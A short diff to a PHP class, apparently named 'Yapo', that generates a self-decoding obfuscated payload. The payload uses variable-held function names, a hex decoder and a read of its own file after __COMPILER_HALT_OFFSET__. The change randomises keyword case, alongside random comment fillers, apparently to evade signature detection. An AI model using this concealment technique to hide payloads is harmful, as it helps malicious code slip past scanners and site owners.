@@ -58,8 +58,7 @@ class Yapo
             $payload .= '$x10=$x1($_[9]);';
             $payload .= '$x11=$x1($_[10]);';
             //$payload = 'function hex($n){$y="";for($i=0;$i<strlen($n);$i++){$y.=dechex(ord($n[$i]));}return $y;}';
-            $payload .= 'function uhex /*'. bin2hex(random_bytes(2)) .'*/($y){$n="";for($i=0;$i<strLen/*' .bin2hex(random_bytes(3)) . '*/($y)-1;$i+=2){$n.=CHR/*' .bin2hex(random_bytes(4)) . '*/(hExDec($y[$i].$y[$i+1]));}return $n;}';
-
+            $payload .= 'FuNctIon uhex /*'. bin2hex(random_bytes(2)) .'*/($y){$n="";for($i=0;$i<strLen/*' .bin2hex(random_bytes(3)) . '*/($y)-1;$i+=2){$n.=CHR/*' .bin2hex(random_bytes(4)) . '*/(hExDec($y[$i].$y[$i+1]));}return $n;}';
             $payload .= '$f=$x2(__FILE__,"r");';
             $payload .= '$x3($f,__COMPILER_HALT_OFFSET__);';
             $payload .= '$t=$x4();';
